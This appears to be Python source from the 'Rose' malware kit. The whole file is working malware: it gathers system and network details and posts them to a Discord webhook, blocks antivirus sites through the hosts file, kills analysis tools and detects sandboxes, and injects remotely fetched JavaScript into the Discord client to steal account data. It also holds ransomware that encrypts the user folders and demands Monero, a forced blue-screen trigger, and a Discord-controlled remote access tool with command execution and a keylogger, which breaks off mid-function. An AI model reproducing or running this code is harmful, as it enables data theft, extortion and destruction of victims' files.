lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1] if subprocess.check_output('wmic os get MUILanguages /format:list', shell=True).decode().strip() else "No Language"
try:
    system_output = subprocess.check_output('wmic os get Caption /format:list', shell=True).decode().strip()
except:
    system_output = None
system = str(system_output.split('\r\r\n')[0].split('=')[1]) if system_output else "No System Information"
output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
product_key = str(output.split('\n', 1)[-1].strip()) if output else "No Product Key"
ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
internal_ip = str(socket.gethostbyname(socket.gethostname()))
external_ip = str(requests.get('https://api.ipify.org').text)
gpus = GPUtil.getGPUs()
gpu_info = str("")
for gpu in gpus:
    gpu_info += f"GPU Name: {gpu.name} - GPU Driver: {gpu.driver} - GPU Memory Total: {gpu.memoryTotal}MB - GPU Memory Free: {gpu.memoryFree}MB - GPU Memory Used: {gpu.memoryUsed}MB"
info = wmi.WMI().Win32_Processor()[0]
cpu_info = str(f"Name: {info.Name} - Arch: x{info.AddressWidth} - Cores: {info.NumberOfCores}")
current_execution_path = str(os.path.join(os.getcwd(), sys.argv[0]))
drives = get_drive_info()
drive_info_string = str(format_drive_info(drives))
mac_address = str(':'.join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0,2*6,2)][::-1]))
processor_id = str(platform.processor())
device_model = (lambda output: output.split("\n")[1].strip() if output else "No Device Model")(str(subprocess.check_output("wmic csproduct get name"), "utf-8"))
current_time_iso = datetime.now().isoformat()

def send_device_information():

    embed = {
        "title":
        "Rose Report",
        "description":
        "Rose Instance - System Information",
        "color":
        eb_color,
        "fields": [
            {
                "name": "Hostname",
                "value":
                    f"`{hostname}`",
                "inline": False,
            },
            {
                "name": "Username",
                "value":
                    f"`{username}`",
                "inline": False,
            },
            {
                "name": "Device Model",
                "value":
                    f"`{device_model}`",
                "inline": False,
            },
            {
                "name": "HWID",
                "value":
                    f"`{hwid}`",
                "inline": False,
            },
            {
                "name": "SSID",
                "value":
                    f"`{ssid}`",
                "inline": False,
            },
            {
                "name": "BSSID",
                "value":
                    f"`{bssid}`",
                "inline": False,
            },
            {
                "name": "Language",
                "value":
                    f"`{lang}`",
                "inline": False,
            },
            {
                "name": "System",
                "value":
                    f"`{system}`",
                "inline": False,
            },
            {
                "name": "Product Key",
                "value":
                     f"`{product_key}`",
                "inline": False,
            },
            {
                "name": "RAM",
                "value":
                    f"`{ram}`",
                "inline": False,
            },
            {
                "name": "Power",
                "value":
                    f"`{power}`",
                "inline": False,
            },
            {
                "name": "Screen",
                "value":
                    f"`{screen}`",
                "inline": False,
            },
            {
                "name": "Internal IP",
                "value":
                    f"`{internal_ip}`",
                "inline": False,
            },
            {
                "name": "External IP",
                "value":
                    f"`{external_ip}`",
                "inline": False,
            },
            {
                "name": "GPU",
                "value":
                    f"`{gpu_info}`",
                "inline": False,
            },
            {
                "name": "CPU",
                "value":
                    f"`{cpu_info}`",
                "inline": False,
            },
            {
                "name": "Current Execution Path",
                "value":
                    f"`{current_execution_path}`",
                "inline": False,
            },
            {
                "name": "Drives",
                "value":
                    f"`{drive_info_string}`",
                "inline": False,
            },
            {
                "name": "MAC Address",
                "value":
                    f"`{mac_address}`",
                "inline": False,
            },
            {
                "name": "Processor ID",
                "value":
                    f"`{processor_id}`",
                "inline": False,
            }
        ],
        "footer": {
            "text": cc.get_footer(),
            "icon_url": cc.get_avatar()
        },
        "author": {
            "name": cc.get_name(),
            "icon_url": cc.get_avatar()
        },
        "timestamp": current_time_iso
    }

    requests.post(webhook, json={"embeds": [embed]})

def block_sites():
    call = subprocess.run(
        "REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell=True,
        capture_output=True)

    if call.returncode != 0:
        hostdirpath = os.path.join("System32", "drivers", "etc")
    else:
        hostdirpath = os.sep.join(
            call.stdout.decode(errors="ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
    hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath, "hosts")
    if not os.path.isfile(hostfilepath):
        return
    with open(hostfilepath) as file:
        data = file.readlines()

    BANNED_SITES = (
    "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com",
    "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com",
    "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com",
    "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com",
    "ccleaner.com")
    newdata = []
    for i in data:
        if any([(x in i) for x in BANNED_SITES]):
            continue
        else:
            newdata.append(i)

    for i in BANNED_SITES:
        newdata.append("\t0.0.0.0 {}".format(i))
        newdata.append("\t0.0.0.0 www.{}".format(i))

    newdata = "\n".join(newdata).replace("\n\n", "\n")

    subprocess.run("attrib -r {}".format(hostfilepath), shell=True,
                   capture_output=True)
    with open(hostfilepath, "w") as file:
        file.write(newdata)
    subprocess.run("attrib +r {}".format(hostfilepath), shell=True,
                   capture_output=True)

def user_check():
    USERS = [
        "Admin",
        "BEE7370C-8C0C-4",
        "DESKTOP-NAKFFMT",
        "WIN-5E07COS9ALR",
        "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG",
        "Q9IATRKPRH",
        "XC64ZB",
        "DESKTOP-D019GDM",
        "DESKTOP-WI8CLET",
        "SERVER1",
        "LISA-PC",
        "JOHN-PC",
        "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R",
        "WILEYPC",
        "WORK",
        "6C4E733F-C2D9-4",
        "RALPHS-PC",
        "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O",
        "QarZhrdBpj",
        "ORELEEPC",
        "ARCHIBALDPC",
        "JULIA-PC",
        "d1bnJkfVlH",
        "WDAGUtilityAccount",
        "Abby",
        "patex",
        "RDhJ0CNFevzX",
        "kEecfMwgj",
        "Frank",
        "8Nl0ColNQ5bq",
        "Lisa",
        "John",
        "george",
        "PxmdUOpVyx",
        "8VizSM",
        "w0fjuOVmCcP5A",
        "lmVwjj9b",
        "PqONjHVwexsS",
        "3u2v9m8",
        "Julia",
        "HEUeRzl",
        "fred",
        "server",
        "BvJChRPnsxn",
        "Harry Johnson",
        "SqgFOf3G",
        "Lucas",
        "mike",
        "PateX",
        "h7dk1xPr",
        "Louise",
        "User01",
        "test",
        "RGzcBUyrznReg",
        "OgJb6GqgK0O",
        "joshuarob",
    ]

    try:
        USER = os.getlogin()
        if USER in USERS:
            return True
    except:
        pass


def process_check():
    PROCESSES = [
        "http toolkit.exe",
        "httpdebuggerui.exe",
        "wireshark.exe",
        "fiddler.exe",
        "charles.exe",
        "regedit.exe",
        "cmd.exe",
        "taskmgr.exe",
        "vboxservice.exe",
        "df5serv.exe",
        "processhacker.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "ida64.exe",
        "ollydbg.exe",
        "pestudio.exe",
        "vmwareuser",
        "vgauthservice.exe",
        "vmacthlp.exe",
        "x96dbg.exe",
        "vmsrvc.exe",
        "x32dbg.exe",
        "vmusrvc.exe",
        "prl_cc.exe",
        "prl_tools.exe",
        "qemu-ga.exe",
        "joeboxcontrol.exe",
        "ksdumperclient.exe",
        "ksdumper.exe",
        "joeboxserver.exe",
        "xenservice.exe",
    ]
    for proc in psutil.process_iter():
        if any(procstr in proc.name().lower() for procstr in PROCESSES):
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass


def hwid_check():
    HWIDS = [
        "7AB5C494-39F5-4941-9163-47F54D6D5016",
        "03DE0294-0480-05DE-1A06-350700080009",
        "11111111-2222-3333-4444-555555555555",
        "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
        "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
        "4C4C4544-0050-3710-8058-CAC04F59344A",
        "00000000-0000-0000-0000-AC1F6BD04972",
        "00000000-0000-0000-0000-000000000000",
        "5BD24D56-789F-8468-7CDC-CAA7222CC121",
        "49434D53-0200-9065-2500-65902500E439",
        "49434D53-0200-9036-2500-36902500F022",
        "777D84B3-88D1-451C-93E4-D235177420A7",
        "49434D53-0200-9036-2500-369025000C65",
        "B1112042-52E8-E25B-3655-6A4F54155DBF",
        "00000000-0000-0000-0000-AC1F6BD048FE",
        "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
        "A15A930C-8251-9645-AF63-E45AD728C20C",
        "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
        "C7D23342-A5D4-68A1-59AC-CF40F735B363",
        "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
        "44B94D56-65AB-DC02-86A0-98143A7423BF",
        "6608003F-ECE4-494E-B07E-1C4615D1D93C",
        "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
        "49434D53-0200-9036-2500-369025003AF0",
        "8B4E8278-525C-7343-B825-280AEBCD3BCB",
        "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        "79AF5279-16CF-4094-9758-F88A616D81B4",
        "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
        "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
        "6ECEAF72-3548-476C-BD8D-73134A9182C8",
        "49434D53-0200-9036-2500-369025003865",
        "119602E8-92F9-BD4B-8979-DA682276D385",
        "12204D56-28C0-AB03-51B7-44A8B7525250",
        "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
        "365B4000-3B25-11EA-8000-3CECEF44010C",
        "D8C30328-1B06-4611-8E3C-E433F4F9794E",
        "00000000-0000-0000-0000-50E5493391EF",
        "00000000-0000-0000-0000-AC1F6BD04D98",
        "4CB82042-BA8F-1748-C941-363C391CA7F3",
        "B6464A2B-92C7-4B95-A2D0-E5410081B812",
        "BB233342-2E01-718F-D4A1-E7F69D026428",
        "9921DE3A-5C1A-DF11-9078-563412000026",
        "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
        "00000000-0000-0000-0000-AC1F6BD04986",
        "C249957A-AA08-4B21-933F-9271BEC63C85",
        "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
        "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
        "3F284CA4-8BDF-489B-A273-41B44D668F6D",
        "BB64E044-87BA-C847-BC0A-C797D1A16A50",
        "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
        "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
        "38AB3342-66B0-7175-0B23-F390B3728B78",
        "48941AE9-D52F-11DF-BBDA-503734826431",
        "A7721742-BE24-8A1C-B859-D7F8251A83D3",
        "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
        "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
        "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
        "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
        "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
        "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
        "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
        "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
        "07AF2042-392C-229F-8491-455123CC85FB",
        "4EDF3342-E7A2-5776-4AE5-57531F471D56",
        "032E02B4-0499-05C3-0806-3C0700080009",
        "11111111-2222-3333-4444-555555555555"
    ]

    try:
        HWID = (
            subprocess.check_output(
                r"wmic csproduct get uuid", creationflags=0x08000000
            )
            .decode()
            .split("\n")[1]
            .strip()
        )

        if HWID in HWIDS:
            return True
    except Exception:
        pass
    

def ip_check():
    try:
        IPS = [
            "None",
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
            "109.74.154.91",
            "93.216.75.209",
            "192.87.28.103",
            "88.132.226.203",
            "195.181.175.105",
            "88.132.225.100",
            "92.211.192.144",
            "34.83.46.130",
            "188.105.91.143",
            "34.85.243.241",
            "34.141.245.25",
            "178.239.165.70",
            "84.147.54.113",
            "193.128.114.45",
            "95.25.81.24",
            "92.211.52.62",
            "88.132.227.238",
            "35.199.6.13",
            "80.211.0.97",
            "34.85.253.170",
            "23.128.248.46",
            "35.229.69.227",
            "34.138.96.23",
            "192.211.110.74",
            "35.237.47.12",
            "87.166.50.213",
            "34.253.248.228",
            "212.119.227.167",
            "193.225.193.201",
            "34.145.195.58",
            "34.105.0.27",
            "195.239.51.3",
            "35.192.93.107",
            "213.33.190.22",
            "194.154.78.152",
            "20.114.22.115",
        ]
        IP = requests.get("https://api.myip.com").json()["ip"]

        if IP in IPS:
            return True
    except:
        pass


def registry_check():
    reg1 = os.system(
        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
    )
    reg2 = os.system(
        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
    )
    if reg1 != 1 and reg2 != 1:
        return True
    handle = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
    )
    try:
        reg_val = winreg.QueryValueEx(handle, "0")[0]
        if ("VMware" or "VBOX") in reg_val:
            return True
    finally:
        winreg.CloseKey(handle)


def dll_check():
    vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
    virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
    if os.path.exists(vmware_dll):
        return True
    if os.path.exists(virtualbox_dll):
        return True


def specs_check():
    try:
        RAM = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
        DISK = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
        if int(RAM) <= 2:
            return True
        if int(DISK) <= 50:
            return True
        if int(psutil.cpu_count()) <= 1:
            return True
    except:
        pass


def proc_check():
    processes = ["VMwareService.exe", "VMwareTray.exe"]
    for proc in psutil.process_iter():
        for program in processes:
            if proc.name() == program:
                return True


def mac_check():
    try:
        MACS = [
            "05:17:5D:75:D5:54",
            "00:03:47:63:8b:de",
            "00:0c:29:05:d8:6e",
            "00:0c:29:2c:c1:21",
            "00:0c:29:52:52:50",
            "00:0d:3a:d2:4f:1f",
            "00:15:5d:00:00:1d",
            "00:15:5d:00:00:a4",
            "00:15:5d:00:00:b3",
            "00:15:5d:00:00:c3",
            "00:15:5d:00:00:f3",
            "00:15:5d:00:01:81",
            "00:15:5d:00:02:26",
            "00:15:5d:00:05:8d",
            "00:15:5d:00:05:d5",
            "00:15:5d:00:06:43",
            "00:15:5d:00:07:34",
            "00:15:5d:00:1a:b9",
            "00:15:5d:00:1c:9a",
            "00:15:5d:13:66:ca",
            "00:15:5d:13:6d:0c",
            "00:15:5d:1e:01:c8",
            "00:15:5d:23:4c:a3",
            "00:15:5d:23:4c:ad",
            "00:15:5d:b6:e0:cc",
            "00:1b:21:13:15:20",
            "00:1b:21:13:21:26",
            "00:1b:21:13:26:44",
            "00:1b:21:13:32:20",
            "00:1b:21:13:32:51",
            "00:1b:21:13:33:55",
            "00:23:cd:ff:94:f0",
            "00:25:90:36:65:0c",
            "00:25:90:36:65:38",
            "00:25:90:36:f0:3b",
            "00:25:90:65:39:e4",
            "00:50:56:97:a1:f8",
            "00:50:56:97:ec:f2",
            "00:50:56:97:f6:c8",
            "00:50:56:a0:06:8d",
            "00:50:56:a0:38:06",
            "00:50:56:a0:39:18",
            "00:50:56:a0:45:03",
            "00:50:56:a0:59:10",
            "00:50:56:a0:61:aa",
            "00:50:56:a0:6d:86",
            "00:50:56:a0:84:88",
            "00:50:56:a0:af:75",
            "00:50:56:a0:cd:a8",
            "00:50:56:a0:d0:fa",
            "00:50:56:a0:d7:38",
            "00:50:56:a0:dd:00",
            "00:50:56:ae:5d:ea",
            "00:50:56:ae:6f:54",
            "00:50:56:ae:b2:b0",
            "00:50:56:ae:e5:d5",
            "00:50:56:b3:05:b4",
            "00:50:56:b3:09:9e",
            "00:50:56:b3:14:59",
            "00:50:56:b3:21:29",
            "00:50:56:b3:38:68",
            "00:50:56:b3:38:88",
            "00:50:56:b3:3b:a6",
            "00:50:56:b3:42:33",
            "00:50:56:b3:4c:bf",
            "00:50:56:b3:50:de",
            "00:50:56:b3:91:c8",
            "00:50:56:b3:94:cb",
            "00:50:56:b3:9e:9e",
            "00:50:56:b3:a9:36",
            "00:50:56:b3:d0:a7",
            "00:50:56:b3:dd:03",
            "00:50:56:b3:ea:ee",
            "00:50:56:b3:ee:e1",
            "00:50:56:b3:f6:57",
            "00:50:56:b3:fa:23",
            "00:e0:4c:42:c7:cb",
            "00:e0:4c:44:76:54",
            "00:e0:4c:46:cf:01",
            "00:e0:4c:4b:4a:40",
            "00:e0:4c:56:42:97",
            "00:e0:4c:7b:7b:86",
            "00:e0:4c:94:1f:20",
            "00:e0:4c:b3:5a:2a",
            "00:e0:4c:b8:7a:58",
            "00:e0:4c:cb:62:08",
            "00:e0:4c:d6:86:77",
            "06:75:91:59:3e:02",
            "08:00:27:3a:28:73",
            "08:00:27:45:13:10",
            "12:1b:9e:3c:a6:2c",
            "12:8a:5c:2a:65:d1",
            "12:f8:87:ab:13:ec",
            "16:ef:22:04:af:76",
            "1a:6c:62:60:3b:f4",
            "1c:99:57:1c:ad:e4",
            "1e:6c:34:93:68:64",
            "2e:62:e8:47:14:49",
            "2e:b8:24:4d:f7:de",
            "32:11:4d:d0:4a:9e",
            "3c:ec:ef:43:fe:de",
            "3c:ec:ef:44:00:d0",
            "3c:ec:ef:44:01:0c",
            "3c:ec:ef:44:01:aa",
            "3e:1c:a1:40:b7:5f",
            "3e:53:81:b7:01:13",
            "3e:c1:fd:f1:bf:71",
            "42:01:0a:8a:00:22",
            "42:01:0a:8a:00:33",
            "42:01:0a:8e:00:22",
            "42:01:0a:96:00:22",
            "42:01:0a:96:00:33",
            "42:85:07:f4:83:d0",
            "4e:79:c0:d9:af:c3",
            "4e:81:81:8e:22:4e",
            "52:54:00:3b:78:24",
            "52:54:00:8b:a6:08",
            "52:54:00:a0:41:92",
            "52:54:00:ab:de:59",
            "52:54:00:b3:e4:71",
            "56:b0:6f:ca:0a:e7",
            "56:e8:92:2e:76:0d",
            "5a:e2:a6:a4:44:db",
            "5e:86:e4:3d:0d:f6",
            "60:02:92:3d:f1:69",
            "60:02:92:66:10:79",
            "7e:05:a3:62:9c:4d",
            "90:48:9a:9d:d5:24",
            "92:4c:a8:23:fc:2e",
            "94:de:80:de:1a:35",
            "96:2b:e9:43:96:76",
            "a6:24:aa:ae:e6:12",
            "ac:1f:6b:d0:48:fe",
            "ac:1f:6b:d0:49:86",
            "ac:1f:6b:d0:4d:98",
            "ac:1f:6b:d0:4d:e4",
            "b4:2e:99:c3:08:3c",
            "b4:a9:5a:b1:c6:fd",
            "b6:ed:9d:27:f4:fa",
            "be:00:e5:c5:0c:e5",
            "c2:ee:af:fd:29:21",
            "c8:9f:1d:b6:58:e4",
            "ca:4d:4b:ca:18:cc",
            "d4:81:d7:87:05:ab",
            "d4:81:d7:ed:25:54",
            "d6:03:e4:ab:77:8e",
            "ea:02:75:3c:90:9f",
            "ea:f6:f1:a2:33:76",
            "f6:a5:41:31:b2:78",
        ]
        MAC = str(getmac.get_mac_address())

        if MAC in MACS:
            return True
    except:
        pass

class InjectionX:
    def __init__(self, webhook: str) -> None:

        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/obf-injection.js').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    @staticmethod
    def get_core(dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    @staticmethod
    def start_discord(dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

target_directory = r'C:/Users'
webhook_url = cc.get_ransomware_discord_webhook_url()
email_adr = cc.get_ransomware_email_adress()
monero_adr = cc.get_ransomware_monero_wallet_adress()
cash = cc.get_ransomware_amount_of_money()

timestamp = datetime.now().isoformat()

def log_error(e):
    data = {
        "username": "Rose Ransomware",
        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png",
        "embeds": [
            {
                "title": "Rose Ransomware Error",
                "url": "https://github.com/voyqge",
                "color": cc.get_color(),
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "ERROR OCCURED",
                        "value": f"`{e}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/voyqge"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

characters = string.ascii_letters + string.digits
user_id = ''.join(random.choice(characters) for i in range(9))

key = Fernet.generate_key()
cipher_suite = Fernet(key)

encryptedfiles = []

ransom_note = f"""Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.

To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.

You can do this by sending {cash} USD to this monero address:
{monero_adr}

Don't know how to get monero? Here are some websites:

https://www.coinbase.com/how-to-buy/monero
https://localmonero.co/?language=en
https://www.okx.com/buy-xmr

Once you have sent the ransom to the monero address you must write an email this this email address: {email_adr}

In this email you will include your personal ID so we know who you are. Your personal ID is: {user_id}

Once you have completeted all of the steps, you will be provided with the key to decrypt your files.

Don't know how ransomware works? Read up here:
https://www.trellix.com/en-us/security-awareness/ransomware/what-is-ransomware.html
https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/
https://www.trendmicro.com/vinfo/us/security/definition/Ransomware

Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the webhook will make it impossible, as the key can not be generated.

Good luck"""

def send_wh():
    data = {
        "username": "Rose Ransomware",
        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png",
        "embeds": [
            {
                "title": "Rose Ransomware Hit",
                "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks. https://github.com/DamagingRose/Rose-Grabber/tree/main/resources/utils/rosedec",
                "url": "https://github.com/gumbobr0t",
                "color": cc.get_color(),
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "TARGET DIR",
                        "value": f"`{target_directory}`",
                        "inline": True
                    },
                    {
                        "name": "DECRYPTION KEY",
                        "value": f"`{key.hex()}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/gumbobr0t"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

def encrypt_file(file_path):
    encryptedfiles.append(file_path)

    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)

    encrypted_file_path = file_path + '.rose.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    os.remove(file_path)

def encrypt_directory(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path)
            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                               errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass
            except Exception as e:
                if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                    pass
                else:
                    log_error(e)

def encrypted_files():
    try:
        with open('ROSE-RANSOMWARE-ENCRYPTED-FILES.txt', 'w') as file:
            for encryptedfile in encryptedfiles:
                file.write(encryptedfile + '\n')
    except Exception as e:
        log_error(e)

def ransomware():

    send_wh()
    encrypt_directory(target_directory)
    encrypted_files()

    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        file_path = os.path.join(desktop, 'ROSE-RANSOMWARE-NOTE.txt')
        with open(file_path, 'w') as f:
            f.write(ransom_note)

        os.startfile(file_path)

    except Exception as e:
        log_error(e)

def Trigger():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

btoken = cc.get_knight_discord_rat_bot_token()
prefix = cc.get_knight_discord_rat_prefix()
channelid = cc.get_knight_discord_rat_channel_id()

dscrd = 'https://discord.gg/sMawrDqnta'
roaming = os.getenv("appdata")
startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
hostname = socket.gethostname()
cwd = os.getcwd()
intents = discord.Intents.all()
bot = commands.Bot(description=f"Running Knight Remote Adminstration Tool.", command_prefix=prefix, intents=intents)
clientid = ''.join(random.choice('0123456789') for i in range(6))
def kstring_random(length):
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    global result_str
    result_str = ''.join(random.choice(letters) for i in range(length))

if channelid == '':
    pass
else:
    @bot.event
    async def on_ready():
        channel = bot.get_channel(int(channelid))
        docs = "<https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md>"
        if cc.get_discord_ping():
            await channel.send(f"@here | New client online: process {clientid}, refer to [documentation]({docs}) for help")
        else:
            await channel.send(f"New client online: process {clientid}, refer to [documentation]({docs}) for help")

@bot.command(name='open')
async def openf(ctx, inputid, fpath):
    if inputid == clientid:
        try:
            os.system(fpath)
            await ctx.send(f'Successfully ran file with the path `{fpath}` for process {clientid}.')
        except Exception:
            await ctx.send(f'Couldn\'t run file with the path `{fpath}` for process {clientid} because of `{Exception}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                os.system(fpath)
                await ctx.send(f'Successfully ran file with the path `{fpath}` for process {clientid}.')
            except Exception:
                await ctx.send(f'Couldn\'t run file with the path `{fpath}` for process {clientid} because of `{Exception}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='taskschd')
async def taskschd(ctx, inputid):
    if inputid == clientid:
        try:
            os.system('taskschd.msc')
            await ctx.send(f'Successfully started windows task scheduler for process {clientid}.')
        except Exception:
            await ctx.send(f'Couldn\'t start windows task scheduler for process {clientid} because of `{Exception}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                os.system('taskschd.msc')
                await ctx.send(f'Successfully started windows task scheduler for process {clientid}.')
            except Exception:
                await ctx.send(f'Couldn\'t start windows task scheduler for process {clientid} because of `{Exception}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='keylogger')
async def keylogger(ctx, inputid, duration):
    if inputid == clientid:
        kstring_random(15)
        record_time = duration
        fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
        end_time = time.monotonic() + int(record_time)
        recorded = []
        try:
            await ctx.send(f'Started keylogger for process {clientid} with a duration of `{duration}` seconds without any problems. You will be notified in `{duration}` seconds, when the final data is being posted.')
            while True:
                if time.monotonic() >= end_time:
                    break
                recorded.append(keyboard.read_event())
        except KeyboardInterrupt:
            await ctx.send(f'Keylogger was killed by secret keystroke for process {clientid} because of `{Exception}`. Exe has been compiled without `--noconsole` probably.')
            pass
        except Exception:
